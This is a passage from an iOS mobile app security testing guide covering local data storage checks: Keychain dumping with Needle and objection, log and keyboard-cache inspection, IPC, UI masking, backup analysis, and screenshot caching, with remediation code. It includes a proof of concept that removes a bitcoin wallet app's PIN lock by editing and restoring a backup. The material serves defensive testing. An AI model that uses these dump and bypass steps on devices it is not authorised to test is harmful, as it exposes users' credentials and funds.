described in the chapter ``Basic Security Testing on iOS''.

The path to the Keychain file is

\begin{verbatim}
/private/var/Keychains/keychain-2.db
\end{verbatim}

On a non-jailbroken device, you can use objection to
\href{https://github.com/sensepost/objection/wiki/Notes-About-The-Keychain-Dumper}{dump
the Keychain items} created and stored by the app.

\hypertarget{dynamic-analysis-with-xcode-and-ios-simulator}{%
\subparagraph{Dynamic Analysis with Xcode and iOS
simulator}\label{dynamic-analysis-with-xcode-and-ios-simulator}}

\begin{quote}
This test is only available on macOS, as Xcode and the iOS simulator is
needed.
\end{quote}

For testing the local storage and verifying what data is stored within
it, it's not mandatory to have an iOS device. With access to the source
code and Xcode the app can be build and deployed in the iOS simulator.
The file system of the current device of the iOS simulator is available
in \texttt{\textasciitilde{}/Library/Developer/CoreSimulator/Devices}.

Once the app is running in the iOS simulator, you can navigate to the
directory of the latest simulator started with the following command:

\begin{verbatim}
$ cd ~/Library/Developer/CoreSimulator/Devices/$(
ls -alht ~/Library/Developer/CoreSimulator/Devices | head -n 2 |
awk '{print $9}' | sed -n '1!p')/data/Containers/Data/Application
\end{verbatim}

The command above will automatically find the UUID of the latest
simulator started. Now you still need to grep for your app name or a
keyword in your app. This will show you the UUID of the app.

\begin{verbatim}
$ grep -iRn keyword .
\end{verbatim}

Then you can monitor and verify the changes in the filesystem of the app
and investigate if any sensitive information is stored within the files
while using the app.

\hypertarget{dynamic-analysis-with-needle}{%
\subparagraph{Dynamic Analysis with
Needle}\label{dynamic-analysis-with-needle}}

On a jailbroken device, you can use the iOS security assessment
framework Needle to find vulnerabilities caused by the application's
data storage mechanism.

Reading the Keychain

To use Needle to read the Keychain, execute the following command:

\begin{verbatim}
[needle] > use storage/data/keychain_dump
[needle][keychain_dump] > run
\end{verbatim}

Searching for Binary Cookies

iOS applications often store binary cookie files in the application
sandbox. Cookies are binary files containing cookie data for application
WebViews. You can use Needle to convert these files to a readable format
and inspect the data. Use the following Needle module, which searches
for binary cookie files stored in the application container, lists their
data protection values, and gives the user the options to inspect or
download the file:

\begin{verbatim}
[needle] > use storage/data/files_binarycookies
[needle][files_binarycookies] > run
\end{verbatim}

Searching for Property List Files

iOS applications often store data in property list (plist) files that
are stored in both the application sandbox and the IPA package.
Sometimes these files contain sensitive information, such as usernames
and passwords; therefore, the contents of these files should be
inspected during iOS assessments. Use the following Needle module, which
searches for plist files stored in the application container, lists
their data protection values, and gives the user the options to inspect
or download the file:

\begin{verbatim}
[needle] > use storage/data/files_plist
[needle][files_plist] > run
\end{verbatim}

Searching for Cache Databases

iOS applications can store data in cache databases. These databases
contain data such as web requests and responses. Sometimes the data is
sensitive. Use the following Needle module, which searches for cache
files stored in the application container, lists their data protection
values, and gives the user the options to inspect or download the file:

\begin{verbatim}
[needle] > use storage/data/files_cachedb
[needle][files_cachedb] > run
\end{verbatim}

Searching for SQLite Databases

iOS applications typically use SQLite databases to store data required
by the application. Testers should check the data protection values of
these files and their contents for sensitive data. Use the following
Needle module, which searches for SQLite databases stored in the
application container, lists their data protection values, and gives the
user the options to inspect or download the file:

\begin{verbatim}
[needle] > use storage/data/files_sql
[needle][files_sql] >
\end{verbatim}

\hypertarget{checking-logs-for-sensitive-data-mstg-storage-3}{%
\subsubsection{Checking Logs for Sensitive Data
(MSTG-STORAGE-3)}\label{checking-logs-for-sensitive-data-mstg-storage-3}}

There are many legitimate reasons for creating log files on a mobile
device, including keeping track of crashes or errors that are stored
locally while the device is offline (so that they can be sent to the
app's developer once online), and storing usage statistics. However,
logging sensitive data, such as credit card numbers and session
information, may expose the data to attackers or malicious applications.
Log files can be created in several ways. The following list shows the
methods available on iOS:

\begin{itemize}
\tightlist
\item
  NSLog Method
\item
  printf-like function
\item
  NSAssert-like function
\item
  Macro
\end{itemize}

\hypertarget{static-analysis-53}{%
\paragraph{Static Analysis}\label{static-analysis-53}}

Use the following keywords to check the app's source code for predefined
and custom logging statements:

\begin{itemize}
\tightlist
\item
  For predefined and built-in functions:

  \begin{itemize}
  \tightlist
  \item
    NSLog
  \item
    NSAssert
  \item
    NSCAssert
  \item
    fprintf
  \end{itemize}
\item
  For custom functions:

  \begin{itemize}
  \tightlist
  \item
    Logging
  \item
    Logfile
  \end{itemize}
\end{itemize}

A generalized approach to this issue is to use a define to enable
\texttt{NSLog} statements for development and debugging, then disable
them before shipping the software. You can do this by adding the
following code to the appropriate PREFIX\_HEADER (*.pch) file:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{\#ifdef DEBUG}
\NormalTok{\#   define }\FunctionTok{NSLog}\NormalTok{ (...) }\FunctionTok{NSLog}\NormalTok{(\_\_VA\_ARGS\_\_)}
\KeywordTok{\#else}
\NormalTok{\#   define }\FunctionTok{NSLog}\NormalTok{ (...)}
\KeywordTok{\#endif}
\end{Highlighting}
\end{Shaded}

\hypertarget{dynamic-analysis-50}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-50}}

In the section ``Monitoring System Logs'' of the chapter ``iOS Basic
Security Testing'' various methods for checking the device logs are
explained. Navigate to a screen that displays input fields that take
sensitive user information.

After starting one of the methods, fill in the input fields. If
sensitive data is displayed in the output, the app fails this test.

\hypertarget{determining-whether-sensitive-data-is-sent-to-third-parties-mstg-storage-4-1}{%
\subsubsection{Determining Whether Sensitive Data Is Sent to Third
Parties
(MSTG-STORAGE-4)}\label{determining-whether-sensitive-data-is-sent-to-third-parties-mstg-storage-4-1}}

Various third-party services can be embedded in the app. The features
these services provide can involve tracking services to monitor the
user's behavior while using the app, selling banner advertisements, or
improving the user experience. The downside to third-party services is
that developers don't know the details of the code executed via
third-party libraries. Consequently, no more information than is
necessary should be sent to a service, and no sensitive information
should be disclosed.

The downside is that a developer doesn't know in detail what code is
executed via 3rd party libraries and therefore giving up visibility.
Consequently it should be ensured that not more than the information
needed is sent to the service and that no sensitive information is
disclosed.

Most third-party services are implemented in two ways:

\begin{itemize}
\tightlist
\item
  with a standalone library
\item
  with a full SDK
\end{itemize}

\hypertarget{static-analysis-54}{%
\paragraph{Static Analysis}\label{static-analysis-54}}

To determine whether API calls and functions provided by the third-party
library are used according to best practices, review their source code.

All data that's sent to third-party services should be anonymized to
prevent exposure of PII (Personal Identifiable Information) that would
allow the third party to identify the user account. No other data (such
as IDs that can be mapped to a user account or session) should be sent
to a third party.

\hypertarget{dynamic-analysis-51}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-51}}

All requests made to external services should be analyzed for embedded
sensitive information. By using an interception proxy, you can
investigate the traffic between the app and the third party's endpoints.
When the app is in use, all requests that don't go directly to the
server that hosts the main function should be checked for sensitive
information that's sent to a third party. This information could be PII
in a request to a tracking or ad service.

\hypertarget{finding-sensitive-data-in-the-keyboard-cache-mstg-storage-5}{%
\subsubsection{Finding Sensitive Data in the Keyboard Cache
(MSTG-STORAGE-5)}\label{finding-sensitive-data-in-the-keyboard-cache-mstg-storage-5}}

Several options for simplifying keyboard input are available to users.
These options include autocorrection and spell checking. Most keyboard
input is cached by default, in
\texttt{/private/var/mobile/Library/Keyboard/dynamic-text.dat}.

The
\href{https://developer.apple.com/reference/uikit/uitextinputtraits}{UITextInputTraits
protocol} is used for keyboard caching. The UITextField, UITextView, and
UISearchBar classes automatically support this protocol and it offers
the following properties:

\begin{itemize}
\tightlist
\item
  \texttt{var\ autocorrectionType:\ UITextAutocorrectionType} determines
  whether autocorrection is enabled during typing. When autocorrection
  is enabled, the text object tracks unknown words and suggests suitable
  replacements, replacing the typed text automatically unless the user
  overrides the replacement. The default value of this property is
  \texttt{UITextAutocorrectionTypeDefault}, which for most input methods
  enables autocorrection.
\item
  \texttt{var\ secureTextEntry:\ BOOL} determines whether text copying
  and text caching are disabled and hides the text being entered for
  \texttt{UITextField}. The default value of this property is
  \texttt{NO}.
\end{itemize}

\hypertarget{static-analysis-55}{%
\paragraph{Static Analysis}\label{static-analysis-55}}

\begin{itemize}
\tightlist
\item
  Search through the source code for similar implementations, such as
\end{itemize}

\begin{verbatim}
  textObject.autocorrectionType = UITextAutocorrectionTypeNo;
  textObject.secureTextEntry = YES;
\end{verbatim}

\begin{itemize}
\tightlist
\item
  Open xib and storyboard files in the \texttt{Interface\ Builder} of
  Xcode and verify the states of \texttt{Secure\ Text\ Entry} and
  \texttt{Correction} in the \texttt{Attributes\ Inspector} for the
  appropriate object.
\end{itemize}

The application must prevent the caching of sensitive information
entered into text fields. You can prevent caching by disabling it
programmatically, using the
\texttt{textObject.autocorrectionType\ =\ UITextAutocorrectionTypeNo}
directive in the desired UITextFields, UITextViews, and UISearchBars.
For data that should be masked, such as PINs and passwords, set
\texttt{textObject.secureTextEntry} to \texttt{YES}.

\begin{verbatim}
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
\end{verbatim}

\hypertarget{dynamic-analysis-52}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-52}}

If a jailbroken iPhone is available, execute the following steps:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Reset your iOS device keyboard cache by navigating to Settings
  \textgreater{} General \textgreater{} Reset \textgreater{} Reset
  Keyboard Dictionary.
\item
  Use the application and identify the functionalities that allow users
  to enter sensitive data.
\item
  Dump the keyboard cache file \texttt{dynamic-text.dat} into the
  following directory (which might be different for iOS versions before
  8.0): \texttt{/private/var/mobile/Library/Keyboard/}
\item
  Look for sensitive data, such as username, passwords, email addresses,
  and credit card numbers. If the sensitive data can be obtained via the
  keyboard cache file, the app fails this test.
\end{enumerate}

With Needle:

\begin{verbatim}
[needle] > use storage/caching/keyboard_autocomplete
[needle] > run

[*] Checking connection with device...
[+] Already connected to: 142.16.24.31
[*] Running strings over keyboard autocomplete databases...
[+] The following content has been found:
    DynamicDictionary-5
    check
    darw
    Frida
    frid
    gawk
    iasdasdt11
    installdeopbear
    Minh
    mter
    needle
    openssl
    openss
    produce
    python
    truchq
    wallpaper
    DynamicDictionary-5
[*] Saving output to file: /home/phanvanloc/.needle/output/keyboard_autocomplete.txt
\end{verbatim}

\begin{verbatim}
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
\end{verbatim}

If you must use a non-jailbroken iPhone:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Reset the keyboard cache.
\item
  Key in all sensitive data.
\item
  Use the app again and determine whether autocorrect suggests
  previously entered sensitive information.
\end{enumerate}

\hypertarget{determining-whether-sensitive-data-is-exposed-via-ipc-mechanisms-mstg-storage-6}{%
\subsubsection{Determining Whether Sensitive Data Is Exposed via IPC
Mechanisms
(MSTG-STORAGE-6)}\label{determining-whether-sensitive-data-is-exposed-via-ipc-mechanisms-mstg-storage-6}}

\hypertarget{overview-49}{%
\paragraph{Overview}\label{overview-49}}

\href{https://nshipster.com/inter-process-communication/}{Inter Process
Communication (IPC)} allows processes to send each other messages and
data. For processes that need to communicate with each other, there are
different ways to implement IPC on iOS:

\begin{itemize}
\tightlist
\item
  \textbf{\href{https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html}{XPC
  Services}}: XPC is a structured, asynchronous library that provides
  basic interprocess communication. It is managed by \texttt{launchd}.
  It is the most secure and flexible implementation of IPC on iOS and
  should be the preferred method. It runs in the most restricted
  environment possible: sandboxed with no root privilege escalation and
  minimal file system access and network access. Two different APIs are
  used with XPC Services:

  \begin{itemize}
  \tightlist
  \item
    NSXPCConnection API
  \item
    XPC Services API
  \end{itemize}
\item
  \textbf{\href{https://developer.apple.com/documentation/foundation/nsmachport}{Mach
  Ports}}: All IPC communication ultimately relies on the Mach Kernel
  API. Mach Ports allow local communication (intra-device communication)
  only. They can be implemented either natively or via Core Foundation
  (CFMachPort) and Foundation (NSMachPort) wrappers.
\item
  \textbf{NSFileCoordinator}: The class \texttt{NSFileCoordinator} can
  be used to manage and send data to and from apps via files that are
  available on the local file system to various processes.
  \href{https://www.atomicbird.com/blog/sharing-with-app-extensions}{NSFileCoordinator}
  methods run synchronously, so your code will be blocked until they
  stop executing. That's convenient because you don't have to wait for
  an asynchronous block callback, but it also means that the methods
  block the running thread.
\end{itemize}

\hypertarget{static-analysis-56}{%
\paragraph{Static Analysis}\label{static-analysis-56}}

The following section summarizes keywords that you should look for to
identify IPC implementations within iOS source code.

\hypertarget{xpc-services}{%
\subparagraph{XPC Services}\label{xpc-services}}

Several classes may be used to implement the NSXPCConnection API:

\begin{itemize}
\tightlist
\item
  NSXPCConnection
\item
  NSXPCInterface
\item
  NSXPCListener
\item
  NSXPCListenerEndpoint
\end{itemize}

You can set
\href{https://www.objc.io/issues/14-mac/xpc/\#security-attributes-of-the-connection}{security
attributes} for the connection. The attributes should be verified.

Check for the following two files in the Xcode project for the XPC
Services API (which is C-based):

\begin{itemize}
\tightlist
\item
  \href{https://developer.apple.com/documentation/xpc/xpc_services_xpc.h}{\texttt{xpc.h}}
\item
  \texttt{connection.h}
\end{itemize}

\hypertarget{mach-ports}{%
\subparagraph{Mach Ports}\label{mach-ports}}

Keywords to look for in low-level implementations:

\begin{itemize}
\tightlist
\item
  mach\_port\_t
\item
  mach\_msg\_*
\end{itemize}

Keywords to look for in high-level implementations (Core Foundation and
Foundation wrappers):

\begin{itemize}
\tightlist
\item
  CFMachPort
\item
  CFMessagePort
\item
  NSMachPort
\item
  NSMessagePort
\end{itemize}

\hypertarget{nsfilecoordinator}{%
\subparagraph{NSFileCoordinator}\label{nsfilecoordinator}}

Keywords to look for:

\begin{itemize}
\tightlist
\item
  NSFileCoordinator
\end{itemize}

\hypertarget{dynamic-analysis-53}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-53}}

Verify IPC mechanisms with static analysis of the iOS source code. No
iOS tool is currently available to verify IPC usage.

\hypertarget{checking-for-sensitive-data-disclosed-through-the-user-interface-mstg-storage-7}{%
\subsubsection{Checking for Sensitive Data Disclosed Through the User
Interface
(MSTG-STORAGE-7)}\label{checking-for-sensitive-data-disclosed-through-the-user-interface-mstg-storage-7}}

\hypertarget{overview-50}{%
\paragraph{Overview}\label{overview-50}}

Entering sensitive information when, for example, registering an account
or making payments, is an essential part of using many apps. This data
may be financial information such as credit card data or user account
passwords. The data may be exposed if the app doesn't properly mask it
while it is being typed.

Masking sensitive data (by showing asterisks or dots instead of clear
text) should be enforced.

\hypertarget{static-analysis-57}{%
\paragraph{Static Analysis}\label{static-analysis-57}}

A text field that masks its input can be configured in two ways:

\textbf{Storyboard} In the iOS project's storyboard, navigate to the
configuration options for the text field that takes sensitive data. Make
sure that the option ``Secure Text Entry'' is selected. If this option
is activated, dots are shown in the text field in place of the text
input.

\textbf{Source Code} If the text field is defined in the source code,
make sure that the option
\href{https://developer.apple.com/documentation/uikit/uitextinputtraits/1624427-issecuretextentry}{isSecureTextEntry}
is set to ``true''. This option obscures the text input by showing dots.

\begin{verbatim}
sensitiveTextField.isSecureTextEntry = true
\end{verbatim}

\hypertarget{dynamic-analysis-54}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-54}}

To determine whether the application leaks any sensitive information to
the user interface, run the application and identify components that
either show such information or take it as input.

If the information is masked by, for example, asterisks or dots, the app
isn't leaking data to the user interface.

\hypertarget{testing-backups-for-sensitive-data-mstg-storage-8-1}{%
\subsubsection{Testing Backups for Sensitive Data
(MSTG-STORAGE-8)}\label{testing-backups-for-sensitive-data-mstg-storage-8-1}}

\hypertarget{overview-51}{%
\paragraph{Overview}\label{overview-51}}

iOS includes auto-backup features that create copies of the data stored
on the device. You can make iOS backups from your host computer by using
iTunes (till macOS Catalina) or Finder (from macOS Catalina onwards), or
via the iCloud backup feature. In both cases, the backup includes nearly
all data stored on the iOS device except highly sensitive data such as
Apple Pay information and Touch ID settings.

Since iOS backs up installed apps and their data, an obvious concern is
whether sensitive user data stored by the app might unintentionally leak
through the backup. Another concern, though less obvious, is whether
sensitive configuration settings used to protect data or restrict app
functionality could be tampered to change app behavior after restoring a
modified backup. Both concerns are valid and these vulnerabilities have
proven to exist in a vast number of apps today.

\hypertarget{how-the-keychain-is-backed-up}{%
\subparagraph{How the Keychain Is Backed
Up}\label{how-the-keychain-is-backed-up}}

When users back up their iOS device, the Keychain data is backed up as
well, but the secrets in the Keychain remain encrypted. The class keys
necessary to decrypt the Keychain data aren't included in the backup.
Restoring the Keychain data requires restoring the backup to a device
and unlocking the device with the users passcode.

Keychain items for which the
\texttt{kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly} attribute is
set can be decrypted only if the backup is restored to the backed up
device. Someone trying to extract this Keychain data from the backup
couldn't decrypt it without access to the crypto hardware inside the
originating device.

One caveat to using the Keychain, however, is that it was only designed
to store small bits of user data or short notes (according to Apple's
documenation on
\href{https://developer.apple.com/documentation/security/keychain_services}{Keychain
Services}). This means that apps with larger local secure storage needs
(e.g., messaging apps, etc.) should encrypt the data within the app
container, but use the Keychain to store key material. In cases where
sensitive configuration settings (e.g., data loss prevention policies,
password policies, compliance policies, etc) must remain unencrypted
within the app container, you can consider storing a hash of the
policies in the keychain for integrity checking. Without an integrity
check, these settings could be modified within a backup and then
restored back to the device to modify app behavior (e.g., change
configured remote endpoints) or security settings (e.g., jailbreak
detection, certificate pinning, maximum UI login attempts, etc.).

The takeaway: If sensitive data is handled as recommended earlier in
this chapter (e.g., stored in the Keychain, with Keychain backed
integrity checks, or encrypted with a key that's locked inside the
Keychain), backups shouldn't be security issue.

\hypertarget{static-analysis-58}{%
\subparagraph{Static Analysis}\label{static-analysis-58}}

A backup of a device on which a mobile application has been installed
will include all subdirectories (except for \texttt{Library/Caches/})
and files in the
\href{https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html\#//apple_ref/doc/uid/TP40010672-CH2-SW12}{app's
private directory}.

Therefore, avoid storing sensitive data in plaintext within any of the
files or folders that are in the app's private directory or
subdirectories.

Although all the files in \texttt{Documents/} and
\texttt{Library/Application\ Support/} are always backed up by default,
you can
\href{https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html\#//apple_ref/doc/uid/TP40010672-CH2-SW28}{exclude
files from the backup} by calling
\texttt{NSURL\ setResourceValue:forKey:error:} with the
\texttt{NSURLIsExcludedFromBackupKey} key.

You can use the
\href{https://developer.apple.com/reference/foundation/nsurl\#//apple_ref/c/data/NSURLIsExcludedFromBackupKey}{NSURLIsExcludedFromBackupKey}
and
\href{https://developer.apple.com/reference/corefoundation/cfurl-rd7\#//apple_ref/c/data/kCFURLIsExcludedFromBackupKey}{CFURLIsExcludedFromBackupKey}
file system properties to exclude files and directories from backups. An
app that needs to exclude many files can do so by creating its own
subdirectory and marking that directory excluded. Apps should create
their own directories for exclusion instead of excluding system-defined
directories.

Both file system properties are preferable to the deprecated approach of
directly setting an extended attribute. All apps running on iOS version
5.1 and later should use these properties to exclude data from backups.

The following is
\href{https://developer.apple.com/library/content/qa/qa1719/index.html}{sample
Objective-C code for excluding a file from a backup} on iOS 5.1 and
later:

\begin{verbatim}
- (BOOL)addSkipBackupAttributeToItemAtPath:(NSString *) filePathString
{
    NSURL* URL= [NSURL fileURLWithPath: filePathString];
    assert([[NSFileManager defaultManager] fileExistsAtPath: [URL path]]);

    NSError *error = nil;
    BOOL success = [URL setResourceValue: [NSNumber numberWithBool: YES]
                                  forKey: NSURLIsExcludedFromBackupKey error: &error];
    if(!success){
        NSLog(@"Error excluding %@ from backup %@", [URL lastPathComponent], error);
    }
    return success;
}
\end{verbatim}

The following is sample Swift code for excluding a file from a backup on
iOS 5.1 and later, see
\href{https://bencoding.com/2017/02/20/swift-excluding-files-from-icloud-backup/}{Swift
excluding files from iCloud backup} for more information:

\begin{verbatim}
enum ExcludeFileError: Error {
    case fileDoesNotExist
    case error(String)
}

func excludeFileFromBackup(filePath: URL) -> Result<Bool, ExcludeFileError> {
    var file = filePath

    do {
        if FileManager.default.fileExists(atPath: file.path) {
            var res = URLResourceValues()
            res.isExcludedFromBackup = true
            try file.setResourceValues(res)
            return .success(true)

        } else {
            return .failure(.fileDoesNotExist)
        }
    } catch {
        return .failure(.error("Error excluding \(file.lastPathComponent) from backup \(error)"))
    }
}
\end{verbatim}

\hypertarget{dynamic-analysis-55}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-55}}

In order to test the backup, you obviously need to create one first. The
most common way to create a backup of an iOS device is by using iTunes,
which is available for Windows, Linux and of course macOS (till macOS
Mojave). When creating a backup via iTunes you can always only backup
the whole device and not select just a single app. Make sure that the
option ``Encrypt local backup'' in iTunes is not set, so that the backup
is stored in cleartext on your hard drive.

\begin{quote}
iTunes is not available anymore from macOS Catalina onwards. Managing of
an iOS device, including updates, backup and restore has been moved to
the Finder app. The approach remains the same, as described above.
\end{quote}

After the iOS device has been backed up, you need to retrieve the file
path of the backup, which are different locations on each OS. The
official Apple documentation will help you to
\href{https://support.apple.com/en-us/HT204215}{locate backups of your
iPhone, iPad, and iPod touch}.

When you want to navigate to the backup folder up to High Sierra you can
easily do so. Starting with macOS Mojave you will get the following
error (even as root):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\BuiltInTok{pwd}
\ExtensionTok{/Users/foo/Library/Application}\NormalTok{ Support}
\NormalTok{$ }\FunctionTok{ls}\NormalTok{ {-}alh MobileSync}
\ExtensionTok{ls}\NormalTok{: MobileSync: Operation not permitted}
\end{Highlighting}
\end{Shaded}

This is not a permission issue of the backup folder, but a new feature
in macOS Mojave. You can solve this problem by granting full disk access
to your terminal application by following the explanation on
\href{http://osxdaily.com/2018/10/09/fix-operation-not-permitted-terminal-error-macos/}{OSXDaily}.

Before you can access the directory you need to select the folder with
the UDID of your device. Check the section ``Getting the UDID of an iOS
device'' in the ``iOS Basic Security Testing'' chapter on how to
retrieve the UDID.

Once you know the UDID you can navigate into this directory and you will
find the full backup of the whole device, which does include pictures,
app data and whatever might have been stored on the device.

Review the data that's in the backed up files and folders. The structure
of the directories and file names is obfuscated and will look like this:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\BuiltInTok{pwd}
\ExtensionTok{/Users/foo/Library/Application}\NormalTok{ Support/MobileSync/Backup/416f01bd160932d2bf2f95f1f142bc29b1c62dcb/00}
\NormalTok{$ }\FunctionTok{ls} \KeywordTok{|} \FunctionTok{head}\NormalTok{ {-}n 3}
\ExtensionTok{000127b08898088a8a169b4f63b363a3adcf389b}
\ExtensionTok{0001fe89d0d03708d414b36bc6f706f567b08d66}
\ExtensionTok{000200a644d7d2c56eec5b89c1921dacbec83c3e}
\end{Highlighting}
\end{Shaded}

Therefore, it's not straightforward to navigate through it and you will
not find any hints of the app you want to analyze in the directory or
file name. You can consider using the
\href{https://imazing.com}{iMazing} shareware utility to assist here.
Perform a device backup with iMazing and use its built-in backup
explorer to easily analyze app container contents including original
paths and file names.

Without iMazing or similar software you may need to resort to using grep
to identify sensitive data. This is not the most thorough approach but
you can try searching for sensitive data that you have keyed in while
using the app before you made the backup. For example: the username,
password, credit card data, PII or any data that is considered sensitive
in the context of the app.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{\textasciitilde{}/Library/Application}\NormalTok{ Support/MobileSync/Backup/}\OperatorTok{<}\NormalTok{UDID}\OperatorTok{>}
\NormalTok{$ }\FunctionTok{grep}\NormalTok{ {-}iRn }\StringTok{"password"}\NormalTok{ .}
\end{Highlighting}
\end{Shaded}

As described in the Static Analysis section, any sensitive data that
you're able to find should be excluded from the backup, encrypted
properly by using the Keychain or not stored on the device in the first
place.

In case you need to work with an encrypted backup, there are some Python
scripts in
\href{https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts}{DinoSec's
GitHub repo}, such as backup\_tool.py and backup\_passwd.py, that will
serve as a good starting point. However, note that they might not work
with the latest iTunes/Finder versions and might need to be tweaked.

\hypertarget{proof-of-concept-removing-ui-lock-with-tampered-backup}{%
\subparagraph{Proof of Concept: Removing UI Lock with Tampered
Backup}\label{proof-of-concept-removing-ui-lock-with-tampered-backup}}

As discussed earlier, sensitive data is not limited to just user data
and PII. It can also be configuration or settings files that affect app
behavior, restrict functionality, or enable security controls. If you
take a look at the open source bitcoin wallet app,
\href{https://github.com/bither/bither-ios}{Bither}, you'll see that
it's possible to configure a PIN to lock the UI. And after a few easy
steps, you will see how to bypass this UI lock with a modified backup on
a non-jailbroken device.

\begin{longtable}[]{@{}ll@{}}
\toprule
\begin{minipage}[b]{0.47\columnwidth}\raggedright
Enable Pin\strut
\end{minipage} & \begin{minipage}[b]{0.47\columnwidth}\raggedright
Pin Screen\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.47\columnwidth}\raggedright
{[}pin enabled{]}(Images/Chapters/0x06d/bither\_demo\_enable\_pin.PNG"
alt=``configure pin'' width=``270'' /\textgreater{}\strut
\end{minipage} & \begin{minipage}[t]{0.47\columnwidth}\raggedright
\textless img
src="Images/Chapters/0x06d/bither\_demo\_pin\_screen.PNG)\{
width=270\}\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

After you enable the pin, use iMazing to perform a device backup:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Select your device from the list under the \textbf{AVAILABLE} menu.
\item
  Click the top menu option \textbf{Back Up}.
\item
  Follow prompts to complete the backup using defaults.
\end{enumerate}

Next you can open the backup to view app container files within your
target app:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Select your device and click \textbf{Backups} on the top right menu.
\item
  Click the backup you created and select \textbf{View}.
\item
  Navigate to the Bither app from the \textbf{Apps} directory.
\end{enumerate}

At this point you can view all the backed up content for Bither.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/72b672220e785bc400e77500d5ace5fe63dd4db6.png}
\caption{iMazing}
\end{figure}

This is where you can begin parsing through the files looking for
sensitive data. In the screenshot you'll see the
\texttt{net.bither.plist} file which contains the \texttt{pin\_code}
attribute. To remove the UI lock restriction, simply delete the
\texttt{pin\_code} attribute and save the changes.

From there it's possible to easily restore the modified version of
\texttt{net.bither.plist} back onto the device using the licensed
version of iMazing.

The free workaround, however, is to find the plist file in the
obfuscated backup generated by iTunes/Finder. So create your backup of
the device with Bither's PIN code configured. Then, using the steps
described earlier, find the backup directory and grep for ``pin\_code''
as shown below.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{\textasciitilde{}/Library/Application}\NormalTok{ Support/MobileSync/Backup/}\OperatorTok{<}\NormalTok{UDID}\OperatorTok{>}
\NormalTok{$ }\FunctionTok{grep}\NormalTok{ {-}iRn }\StringTok{"pin\_code"}\NormalTok{ .}
\ExtensionTok{Binary}\NormalTok{ file ./13/135416dd5f251f9251e0f07206277586b7eac6f6 matches}
\end{Highlighting}
\end{Shaded}

You'll see there was a match on a binary file with an obfuscated name.
This is your \texttt{net.bither.plist} file. Go ahead and rename the
file giving it a plist extension so Xcode can easily open it up for you.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/56de6a9d5ff0c19a00dc35b70da7bad221861447.png}
\caption{iMazing}
\end{figure}

Again, remove the \texttt{pin\_code} attribute from the plist and save
your changes. Rename the file back to the original name (i.e., without
the plist extension) and perform your backup restore. When the restore
is complete you'll see that Bither no longer prompts you for the PIN
code when launched.

\hypertarget{testing-auto-generated-screenshots-for-sensitive-information-mstg-storage-9}{%
\subsubsection{Testing Auto-Generated Screenshots for Sensitive
Information
(MSTG-STORAGE-9)}\label{testing-auto-generated-screenshots-for-sensitive-information-mstg-storage-9}}

\hypertarget{overview-52}{%
\paragraph{Overview}\label{overview-52}}

Manufacturers want to provide device users with an aesthetically
pleasing effect when an application is started or exited, so they
introduced the concept of saving a screenshot when the application goes
into the background. This feature can pose a security risk because
screenshots (which may display sensitive information such as an email or
corporate documents) are written to local storage, where they can be
recovered by a rogue application with a sandbox bypass exploit or
someone who steals the device.

\hypertarget{static-analysis-59}{%
\paragraph{Static Analysis}\label{static-analysis-59}}

While analyzing the source code, look for the fields or screens that
take or display sensitive data. Use
\href{https://developer.apple.com/documentation/uikit/uiimageview}{UIImageView}
to determine whether the application sanitizes the screen before being
backgrounded.

The following is a sample remediation method that will set a default
screenshot:

\begin{verbatim}
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
    UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
    self.backgroundImage = myBanner;
    [self.window addSubview:myBanner];
}
\end{verbatim}

This sets the background image to \texttt{overlayImage.png} whenever the
application is backgrounded. It prevents sensitive data leaks because
\texttt{overlayImage.png} will always override the current view.

\hypertarget{dynamic-analysis-56}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-56}}

Navigate to an application screen that displays sensitive information,
such as a username, an email address, or account details. Background the
application by hitting the Home button on your iOS device. Connect to
the iOS device and navigate to the following directory (which may be
different for iOS versions below 8.0):

\texttt{/var/mobile/Containers/Data/Application/\$APP\_ID/Library/Caches/Snapshots/}

Screenshot caching vulnerabilities can also be detected with Needle.
This is demonstrated in the following Needle excerpt:

\begin{verbatim}
[needle] > use storage/caching/screenshot
[needle][screenshot] > run
[V] Creating timestamp file...
[*] Launching the app...
[*] Background the app by hitting the home button, then press enter:

[*] Checking for new screenshots...
[+] Screenshots found:
[+]   /private/var/mobile/Containers/Data/Application/APP_ID/Library/Caches/Snapshots/app_name/B75DD942-76D1-4B86-8466-B79F7A78B437@2x.png
